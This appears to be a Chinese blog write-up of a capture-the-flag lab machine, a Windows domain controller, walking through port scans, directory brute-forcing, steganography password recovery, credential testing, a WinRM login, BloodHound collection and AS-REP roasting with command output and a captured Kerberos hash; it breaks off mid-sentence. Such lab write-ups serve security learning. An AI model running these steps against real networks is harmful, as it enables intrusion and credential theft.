<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="https://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1313794ff57095ab.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1313794ff57095ab.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-6fbfdb3e812309fb.js" defer=""></script><script src="/_next/static/_7ZRK1_b_3nw7F46XEgn9/_buildManifest.js" defer=""></script><script src="/_next/static/_7ZRK1_b_3nw7F46XEgn9/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"TheHackersLabsB I G","contentHtml":"\u003ch1\u003eB.I.G\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://labs.thehackerslabs.com/machine/6\"\u003ehttps://labs.thehackerslabs.com/machine/6\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsB%20I%20G/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003ch3\u003ePort scan\u003c/h3\u003e\n\u003cp\u003e使用 \u003ccode\u003enmap\u003c/code\u003e 对端口进行扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BIG nmap -sT -min-rate 10000 -p- 192.168.212.4\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-18 15:47 CST\nWarning: 192.168.212.4 giving up on port because retransmission \u003cspan class=\"hljs-built_in\"\u003ecap\u003c/span\u003e hit (10).\nStrange \u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e error from 192.168.212.4 (104 - \u003cspan class=\"hljs-string\"\u003e'Connection reset by peer'\u003c/span\u003e)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.212.4\nHost is up (0.00037s latency).\nNot shown: 64855 closed tcp ports (conn-refused), 655 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n49671/tcp open  unknown\n49673/tcp open  unknown\n49676/tcp open  unknown\n49686/tcp open  unknown\nMAC Address: 08:00:27:FA:B6:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 26.20 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BIG nmap -sT -A -p $(\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e port | awk -F \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{print $1}'\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003epaste\u003c/span\u003e -sd \u003cspan class=\"hljs-string\"\u003e','\u003c/span\u003e) 192.168.212.4\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-title: Site doesn\u003cspan class=\"hljs-string\"\u003e't have a title (text/html).\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-18 23:51:41Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active D➜  BIG smbclient -L 192.168.212.4 -U anonymous                                 \nPassword for [WORKGROUP\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILURE464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49671/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  msrpc         Microsoft Windows RPC\n49676/tcp open  msrpc         Microsoft Windows RPC\n49686/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 08:00:27:FA:B6:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Microsoft Windows 2016|2019\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019\nOS details: Microsoft Windows Server 2016 or Server 2019\nNetwork Distance: 1 hop\nService Info: Host: BIG; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-07-18T23:52:36\n|_  start_date: 2025-07-18T23:44:01\n|_nbstat: NetBIOS name: BIG, NetBIOS user: \u0026#x3C;unknown\u003e, NetBIOS MAC: 08:00:27:fa:b6:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n|_clock-skew: 15h59m55s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.53 ms 192.168.212.4\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 83.13 seconds\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举测试\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eSMB\u003c/code\u003e 匿名账户测试\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BIG smbclient -L 192.168.212.4 -U anonymous                                 \nPassword \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e [WORKGROUP\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILURE\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWEB\u003c/h2\u003e\n\u003ch3\u003e目录扫描\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eHTTP\u003c/code\u003e 服务\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsB%20I%20G/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e两段歌词的来源\u003c/p\u003e\n\u003ch3\u003e\u003cstrong\u003eI keep it music music, I eat that lunch (Yeah)\u003c/strong\u003e\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e来源:\u003c/strong\u003e 这句歌词出自 \u003cstrong\u003eTravis Scott\u003c/strong\u003e 2023年专辑《UTOPIA》中的大热单曲 \u003cstrong\u003e《FE!N》\u003c/strong\u003e，是客串的歌手 \u003cstrong\u003ePlayboi Carti\u003c/strong\u003e 的部分。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e含义解析:\u003c/strong\u003e 这句歌词是典型的Playboi Carti风格，用极简但充满态度的语言来表达自己的状态。\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eI keep it music music\u003c/code\u003e\u003c/strong\u003e: 这句话的意思是“我的世界里只有音乐，我一直专注于音乐”。他用重复的“music music”来强调自己完全沉浸在创作和音乐的氛围中，这是他生活的核心和全部重心。这是一种对自己艺术家身份的强调。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eI eat that lunch\u003c/code\u003e\u003c/strong\u003e: 这是一句非常形象的俚语，意思是**“我轻松搞定一切”、“我把竞争对手都干掉了”**。想象一下，吃午餐是一件多么轻松日常的事情。他用这个比喻来表示他在说唱游戏（Rap Game）中游刃有余，把击败对手、取得成功看得像吃午饭一样简单。这是一种极度自信和傲慢的炫耀（Bragging）。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch3\u003e\u003cstrong\u003eIt was all a dream\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e它是一个文化符号，是嘻哈历史上最经典、最标志性的开场白之一。\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e来源:\u003c/strong\u003e 这句歌词出自传奇说唱歌手 \u003cstrong\u003eThe Notorious B.I.G. (又名 Biggie Smalls)\u003c/strong\u003e 在1994年发布的歌曲 \u003cstrong\u003e《Juicy》\u003c/strong\u003e。这首歌是他的首张专辑《Ready to Die》中的主打单曲，也是他的成名作。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e原文和背景:\u003c/strong\u003e 完整的开场是：\u003c/p\u003e\n\u003cp\u003e\"It was all a dream, I used to read Word Up! magazine\nSalt-n-Pepa and Heavy D up in the limousine\"\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003cp\u003e对网站目录爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BIG feroxbuster --url http://192.168.212.4 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x php,zip,txt\n                                                                                                    \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \u003cspan class=\"hljs-string\"\u003e\"epi\"\u003c/span\u003e Risher 🤓                 ver: 2.11.0\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://192.168.212.4\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 503, 400]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n 💲  Extensions            │ [php, zip, txt]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n301      GET        2l       10w      151c http://192.168.212.4/images =\u003e http://192.168.212.4/images/\n200      GET       21l       41w      435c http://192.168.212.4/\n301      GET        2l       10w      153c http://192.168.212.4/contents =\u003e http://192.168.212.4/contents/\n[\u003e-------------------] - 5s     48285/2491564 5m      found:3       errors:0      \n301      GET        2l       10w      150c http://192.168.212.4/songs =\u003e http://192.168.212.4/songs/\n200      GET        5l       22w      112c http://192.168.212.4/contents/notify.txt\n200      GET       74l      667w     3350c http://192.168.212.4/songs/juicy.txt\n200      GET      396l     2780w   362382c http://192.168.212.4/images/big4.jpg\n200      GET      396l     2780w   362232c http://192.168.212.4/images/big2.jpg\n[####################] - 8m   3322088/3322088 0s      found:6       errors:0      \n[####################] - 8m    830516/830516  1683/s  http://192.168.212.4/ \n[####################] - 8m    830516/830516  1676/s  http://192.168.212.4/images/ \n[####################] - 8m    830516/830516  1676/s  http://192.168.212.4/contents/ \n[####################] - 8m    830516/830516  1684/s  http://192.168.212.4/songs/\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eSkyisthelimit.txt\u003c/code\u003e 还是一个字典\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsB%20I%20G/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsB%20I%20G/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e图片隐写\u003c/h3\u003e\n\u003cp\u003e这一部分看了一下 write-up\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003enotify.txt\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsB%20I%20G/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cem\u003e“你到底雇了哪个该死的家伙来做这个网站！”\n“又把密钥用 MD5 藏起来！”\n“我要炒了那个家伙”\u003c/em\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e那么密码可能是 \u003ccode\u003emusic\u003c/code\u003e 的 \u003ccode\u003eMD5\u003c/code\u003e 值\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BIG \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -n \u003cspan class=\"hljs-string\"\u003e\"music\"\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003emd5sum\u003c/span\u003e                                                 \n18d6769919266cd0bd6cd78aa405d5d0  -\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e那么要在哪里使用密码？藏起来感觉是\u003ccode\u003eMISC\u003c/code\u003e了\u003c/p\u003e\n\u003cp\u003e我们将 \u003ccode\u003eimages/big.jpg\u003c/code\u003e 图片下载下来，使用 \u003ccode\u003esteghide\u003c/code\u003e 来导出数据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BIG steghide extract -sf big1.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big2.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big3.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big4.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是密码不对，主页中还有几段歌词，我们尝试一下\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsB%20I%20G/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BIG \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -n \u003cspan class=\"hljs-string\"\u003e\"I keep it music music\"\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003emd5sum\u003c/span\u003e\na6002952ffda89154a38a248280093d2  -\n➜  BIG \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -n \u003cspan class=\"hljs-string\"\u003e\"I eat that lunch (Yeah)\"\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003emd5sum\u003c/span\u003e\nd2b5f22e80f680d9660a1d3ab81232fd  -\n➜  BIG \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -n \u003cspan class=\"hljs-string\"\u003e\"It was all a dream\"\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003emd5sum\u003c/span\u003e\n99ae77c0c0faf78b872f9f452e3eaa24  -\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e能得到一个文件 \u003ccode\u003efrase.txt\u003c/code\u003e ，使用 MD5 \u003ccode\u003e99ae77c0c0faf78b872f9f452e3eaa24\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BIG steghide extract -sf big2.jpg            \nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big2.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big2.jpg\nEnter passphrase: \nwrote extracted data to \u003cspan class=\"hljs-string\"\u003e\"frase.txt\"\u003c/span\u003e.\n➜  BIG steghide extract -sf big3.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big3.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big3.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big4.jpg  \nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big4.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big4.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e里边是个密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BIG \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e frase.txt           \nBigpoppa1972\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e声名狼藉先生（The Notorious B.I.G.，1972年5月21日——1997年3月9日）\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3\u003e枚举用户名\u003c/h3\u003e\n\u003cp\u003e有了密码，但是不知道的用在哪\u003c/p\u003e\n\u003cp\u003e根据前面得到的信息，\u003ccode\u003emusic\u003c/code\u003e 或者 \u003ccode\u003eJuice\u003c/code\u003e也可能是用户名\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eWho the hell did you hire to create the website!\nHiding keys \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e MD5 again!\nI\u003cspan class=\"hljs-string\"\u003e'm going to fire that guy\n\nmusic\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e测试凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ~ nxc smb 192.168.212.4 -u music -p Bigpoppa1972                    \nSMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False) \nSMB         192.168.212.4   445    BIG              [+] bbr.thl\\music:Bigpoppa1972 \n\n➜  ~ nxc wmi 192.168.212.4 -u music -p Bigpoppa1972\nRPC         192.168.212.4   135    BIG              [*] Windows 10 / Server 2016 Build 14393 (name:BIG) (domain:bbr.thl)\nRPC         192.168.212.4   135    BIG              [+] bbr.thl\\music:Bigpoppa1972 \n\n➜  ~ nxc ldap 192.168.212.4 -u music -p Bigpoppa1972\nLDAP        192.168.212.4   389    BIG              [*] Windows 10 / Server 2016 Build 14393 (name:BIG) (domain:bbr.thl)\nLDAP        192.168.212.4   389    BIG              [+] bbr.thl\\music:Bigpoppa1972 \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e远程登录，进去是\u003ccode\u003eTEMP\u003c/code\u003e用户\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsB%20I%20G/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e当前目录下可以拿到 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\music\\Documents\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e user.txt\n53bxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e域分析\u003c/h2\u003e\n\u003cp\u003e收集信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ~ bloodhound-python -d \u003cspan class=\"hljs-string\"\u003e'bbr.thl'\u003c/span\u003e -ns 192.168.212.4 --zip -c All -dc \u003cspan class=\"hljs-string\"\u003e'BIG.bbr.thl'\u003c/span\u003e -u music -p Bigpoppa1972\nINFO: BloodHound.py \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: bbr.thl\nINFO: Getting TGT \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: BIG.bbr.thl\nINFO: Found 1 domains\nINFO: Found 1 domains \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: BIG.bbr.thl\nINFO: Found 7 \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\nINFO: Found 57 \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: BIG.bbr.thl\nINFO: Done \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 00M 01S\nINFO: Compressing output into 20250718165617_bloodhound.zip\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e用户组信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsB%20I%20G/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e很明显，目标用户是\u003ccode\u003eSONG\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsB%20I%20G/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e通过 \u003ccode\u003eBLoodhound\u003c/code\u003e 可以看到可以用 \u003ccode\u003eAS-REP\u003c/code\u003e 来打\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsB%20I%20G/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e\u003cstrong\u003eAS_REP Roasting\u003c/strong\u003e\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜BIG GetNPUsers.py -dc-ip 192.168.212.4 bbr.thl/ -usersfile \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n$krb5asrep$23\u003cspan class=\"hljs-variable\"\u003e$song\u003c/span\u003e@BBR.THL:6d769bdfb04e89789dae27e05b47a393\u003cspan class=\"hljs-variable\"\u003e$cde1b6fd59270bc8bfd31470ea4d007ac3fe3750ad8d54b6ec2a63e75495569286eb887787747eeb57c690dfacfb3c913823b0c539ce23ddba0fdbc6bacae8f19530\u003c/span\u003e\ncb25f73664a3feafd432ee89e6b56fd6ace082c511a5041b79ef1c8c836b8b3636dca11ed49ff2c372cbf0dd06b184a2575656d41440d7c16e58e8262c3c5a30627c467f84e4dcc83ee19e235bd6168c8abd780d6927f7315a1e16b46cf6570e\nba13b09664cd2cac4a2478c4e67e75d5335a7b61260f79d553d76e96b24ea282d78977e449b130c405a4c2de4c42930f958c8616debbce85dde09896ba30b352\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用 